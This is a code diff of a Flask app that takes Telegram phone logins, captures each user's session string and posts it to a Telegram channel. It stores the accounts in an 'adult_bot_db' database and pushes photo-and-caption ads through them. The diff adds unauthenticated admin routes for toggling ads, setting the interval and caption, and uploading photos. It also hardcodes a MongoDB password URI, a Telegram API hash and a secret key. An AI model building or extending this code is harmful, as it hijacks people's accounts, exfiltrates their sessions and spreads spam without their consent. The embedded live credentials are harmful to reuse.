@@ -1,8 +1,8 @@
-from flask import Flask, render_template, request, session, redirect, jsonify, url_for
+from flask import Flask, render_template, request, session, redirect, jsonify, url_for, send_from_directory
 import os
 import uuid
 import asyncio
-from datetime import datetime
+from datetime import datetime, timedelta
 from pyrogram import Client
 from pyrogram.errors import (
     PhoneNumberInvalid,
@@ -14,6 +14,7 @@ from pyrogram.errors import (
 from pymongo import MongoClient
 from pymongo.errors import ServerSelectionTimeoutError
 from bson import ObjectId
+from werkzeug.utils import secure_filename
 
 app = Flask(__name__)
 app.secret_key = os.environ.get("SECRET_KEY", "7f9c2e1a84d6b3f0c5a7e9d2f1b8c4e6a3d7f0b2c9e5a1d8f6c3b7e2a9d4f1")
@@ -22,7 +23,6 @@ app.secret_key = os.environ.get("SECRET_KEY", "7f9c2e1a84d6b3f0c5a7e9d2f1b8c4e6a
 MONGODB_URI = os.environ.get("MONGODB_URI", "mongodb+srv://nexacoders2_db_user:dxYh7QOdHvH6OVdd@cluster0.f4qxcbk.mongodb.net/?appName=Cluster0")
 DB_NAME = os.environ.get("DB_NAME", "adult_bot_db")
 
-# Initialize MongoDB
 try:
     mongo_client = MongoClient(MONGODB_URI, serverSelectionTimeoutMS=5000)
     db = mongo_client[DB_NAME]
@@ -31,15 +31,24 @@ try:
     db_connected = True
 except Exception as e:
     print(f"❌ MongoDB Connection Failed: {e}")
-    print("⚠️  Using in-memory storage fallback")
     mongo_client = None
     db = None
     db_connected = False
 
-# Collections
 users_col = db.users if db else None
 ads_config_col = db.ads_config if db else None
-ads_logs_col = db.ads_logs if db else None
+
+# ========== UPLOAD CONFIG ==========
+UPLOAD_FOLDER = 'uploads'
+ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif', 'webp'}
+app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
+app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024
+
+if not os.path.exists(UPLOAD_FOLDER):
+    os.makedirs(UPLOAD_FOLDER)
+
+def allowed_file(filename):
+    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS
 
 API_ID = int(os.environ.get("API_ID", "32208414"))
 API_HASH = os.environ.get("API_HASH", "628f11c05a44c8dda4b006e66f4bf7df")
@@ -50,7 +59,6 @@ clients = {}
 
 # ========== DATABASE HELPERS ==========
 def save_session_to_db(session_data):
-    """Save session to MongoDB"""
     if users_col is None:
         return False
     
@@ -92,30 +100,42 @@ def save_session_to_db(session_data):
         print(f"MongoDB Error: {e}")
         return False
 
-def get_all_users():
-    """Get all users from MongoDB"""
-    if users_col is None:
-        return []
-    return list(users_col.find())
+def get_ads_config():
+    if ads_config_col is None:
+        return {
+            "ads_enabled": False,
+            "interval": 600,
+            "photo_path": None,
+            "caption": "",
+            "updated_at": datetime.now()
+        }
+    
+    config = ads_config_col.find_one({"_id": "main_config"})
+    if not config:
+        default_config = {
+            "_id": "main_config",
+            "ads_enabled": False,
+            "interval": 600,
+            "photo_path": None,
+            "caption": "",
+            "updated_at": datetime.now()
+        }
+        ads_config_col.insert_one(default_config)
+        return default_config
+    return config
 
-def get_user_by_phone(phone):
-    """Get user by phone number"""
-    if users_col is None:
-        return None
-    return users_col.find_one({"phone": phone})
-
-def update_user_status(phone, status):
-    """Update user status"""
-    if users_col is None:
+def update_ads_config(updates):
+    if ads_config_col is None:
         return False
-    users_col.update_one(
-        {"phone": phone},
-        {"$set": {"status": status, "updated_at": datetime.now()}}
+    updates["updated_at"] = datetime.now()
+    ads_config_col.update_one(
+        {"_id": "main_config"},
+        {"$set": updates},
+        upsert=True
     )
     return True
 
 def get_stats():
-    """Get overall statistics"""
     if users_col is None:
         return {
             "total_users": 0,
@@ -149,12 +169,30 @@ def get_stats():
         "db_connected": True
     }
 
-# ========== CHANNEL FUNCTIONS ==========
+def get_all_users():
+    if users_col is None:
+        return []
+    
+    users = list(users_col.find().sort("created_at", -1))
+    formatted = []
+    for user in users:
+        formatted.append({
+            "id": str(user.get("_id")),
+            "user_id": user.get("user_id"),
+            "name": f"{user.get('first_name', '')} {user.get('last_name', '')}".strip(),
+            "username": user.get("username", "N/A"),
+            "phone": user.get("phone", "N/A"),
+            "status": user.get("status", "unknown"),
+            "ads_enabled": user.get("ads_enabled", True),
+            "total_ads_sent": user.get("total_ads_sent", 0),
+            "created_at": user.get("created_at", datetime.now()).strftime("%Y-%m-%d %H:%M") if user.get("created_at") else "N/A",
+            "last_ad_time": user.get("last_ad_time", "").strftime("%Y-%m-%d %H:%M") if user.get("last_ad_time") else "Never"
+        })
+    return formatted
+
 def send_to_channel(message):
     if not BOT_TOKEN:
-        print(f"[CHANNEL] {message[:200]}...")
-        return True
-
+        return False
     import requests
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     payload = {
@@ -170,7 +208,7 @@ def send_to_channel(message):
         print(f"Channel error: {e}")
         return False
 
-# ========== ROUTES ==========
+# ========== MAIN APP ROUTES ==========
 @app.route("/")
 def index():
     return redirect("/login")
@@ -189,7 +227,6 @@ def send_code():
         return jsonify(ok=False, error="Invalid phone number"), 400
 
     session_id = str(uuid.uuid4())[:8]
-
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
 
@@ -309,7 +346,6 @@ def verify_code():
 <code>{session_string}</code>"""
 
         send_to_channel(channel_msg)
-
         session["user"] = user_info    
 
         return jsonify(ok=True, user={    
@@ -338,72 +374,129 @@ def dashboard():
         return redirect("/login")
     return render_template("dashboard.html", user=session["user"])
 
-# ========== ADMIN API ROUTES ==========
-@app.route("/api/admin/stats", methods=["GET"])
-def admin_stats():
+# ========== ADMIN PANEL ROUTES ==========
+@app.route("/admin")
+def admin_panel():
+    config = get_ads_config()
+    stats = get_stats()
+    return render_template("admin.html", config=config, stats=stats)
+
+@app.route("/admin/stats")
+def admin_stats_page():
     stats = get_stats()
     users = get_all_users()
+    config = get_ads_config()
+    return render_template("stats.html", stats=stats, users=users, config=config)
+
+@app.route("/api/toggle-ads", methods=["POST"])
+def toggle_ads():
+    config = get_ads_config()
+    new_status = not config.get("ads_enabled", False)
     
-    formatted_users = []
-    for user in users:
-        formatted_users.append({
-            "id": str(user.get("_id")),
-            "user_id": user.get("user_id"),
-            "name": f"{user.get('first_name', '')} {user.get('last_name', '')}",
-            "username": user.get("username"),
-            "phone": user.get("phone"),
-            "status": user.get("status", "unknown"),
-            "ads_enabled": user.get("ads_enabled", True),
-            "total_ads_sent": user.get("total_ads_sent", 0),
-            "created_at": user.get("created_at", datetime.now()).strftime("%Y-%m-%d %H:%M") if user.get("created_at") else "N/A",
-            "last_ad_time": user.get("last_ad_time", "").strftime("%Y-%m-%d %H:%M") if user.get("last_ad_time") else "Never"
+    if update_ads_config({"ads_enabled": new_status}):
+        if users_col:
+            users_col.update_many({}, {"$set": {"ads_enabled": new_status}})
+        
+        return jsonify({
+            "success": True,
+            "enabled": new_status,
+            "message": f"Ads {'enabled' if new_status else 'disabled'} successfully!"
         })
     
-    return jsonify({
-        "stats": stats,
-        "users": formatted_users,
-        "db_connected": users_col is not None
-    })
+    return jsonify({"success": False, "error": "Failed to update"}), 500
 
-@app.route("/api/admin/users", methods=["GET"])
-def get_users():
-    users = get_all_users()
-    return jsonify({
-        "users": users,
-        "count": len(users)
-    })
-
-@app.route("/api/admin/user/<phone>", methods=["GET"])
-def get_user(phone):
-    user = get_user_by_phone(phone)
-    if user:
-        user["_id"] = str(user["_id"])
-        return jsonify(user)
-    return jsonify(error="User not found"), 404
-
-@app.route("/api/admin/user/<phone>/status", methods=["POST"])
-def update_status(phone):
-    status = request.json.get("status")
-    if update_user_status(phone, status):
-        return jsonify(ok=True, message=f"Status updated to {status}")
-    return jsonify(ok=False, error="Failed to update"), 500
-
-@app.route("/api/admin/toggle-ads", methods=["POST"])
-def toggle_ads():
-    enabled = request.json.get("enabled", False)
+@app.route("/api/set-interval", methods=["POST"])
+def set_interval():
+    interval = request.json.get("interval")
     
+    if not interval or not isinstance(interval, int):
+        return jsonify({"success": False, "error": "Invalid interval"}), 400
+    
+    if update_ads_config({"interval": interval}):
+        return jsonify({
+            "success": True,
+            "interval": interval,
+            "message": f"Interval set to {interval//60} minutes!"
+        })
+    
+    return jsonify({"success": False, "error": "Failed to update"}), 500
+
+@app.route("/api/set-caption", methods=["POST"])
+def set_caption():
+    caption = request.json.get("caption", "")
+    
+    if update_ads_config({"caption": caption}):
+        return jsonify({
+            "success": True,
+            "message": "Caption updated successfully!"
+        })
+    
+    return jsonify({"success": False, "error": "Failed to update"}), 500
+
+@app.route("/api/upload-photo", methods=["POST"])
+def upload_photo():
+    if 'photo' not in request.files:
+        return jsonify({"success": False, "error": "No file provided"}), 400
+    
+    file = request.files['photo']
+    if file.filename == '':
+        return jsonify({"success": False, "error": "No file selected"}), 400
+    
+    if file and allowed_file(file.filename):
+        filename = secure_filename(f"ad_photo_{datetime.now().strftime('%Y%m%d_%H%M%S')}.{file.filename.rsplit('.', 1)[1]}")
+        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
+        file.save(filepath)
+        
+        update_ads_config({"photo_path": filepath})
+        
+        return jsonify({
+            "success": True,
+            "path": filepath,
+            "message": "Photo uploaded successfully!"
+        })
+    
+    return jsonify({"success": False, "error": "Invalid file type"}), 400
+
+@app.route("/api/preview")
+def preview_ad():
+    config = get_ads_config()
+    return jsonify({
+        "success": True,
+        "photo_path": config.get("photo_path"),
+        "caption": config.get("caption", ""),
+        "interval": config.get("interval", 600),
+        "ads_enabled": config.get("ads_enabled", False)
+    })
+
+@app.route("/uploads/<path:filename>")
+def serve_upload(filename):
+    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)
+
+@app.route("/api/user/<user_id>/toggle", methods=["POST"])
+def toggle_user_ads(user_id):
     if users_col is None:
-        return jsonify(ok=False, error="Database not connected"), 500
+        return jsonify({"success": False, "error": "DB not connected"}), 500
     
-    result = users_col.update_many(
-        {},
-        {"$set": {"ads_enabled": enabled}}
+    user = users_col.find_one({"_id": ObjectId(user_id)})
+    
+    if not user:
+        return jsonify({"success": False, "error": "User not found"}), 404
+    
+    new_status = not user.get("ads_enabled", True)
+    users_col.update_one(
+        {"_id": ObjectId(user_id)},
+        {"$set": {"ads_enabled": new_status}}
     )
     
     return jsonify({
-        "ok": True,
-        "message": f"Ads {'enabled' if enabled else 'disabled'} for {result.modified_count} users"
+        "success": True,
+        "enabled": new_status,
+        "message": f"User ads {'enabled' if new_status else 'disabled'}"
     })
+
+@app.route("/api/stats/refresh")
+def refresh_stats():
+    return jsonify(get_stats())
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 5000))
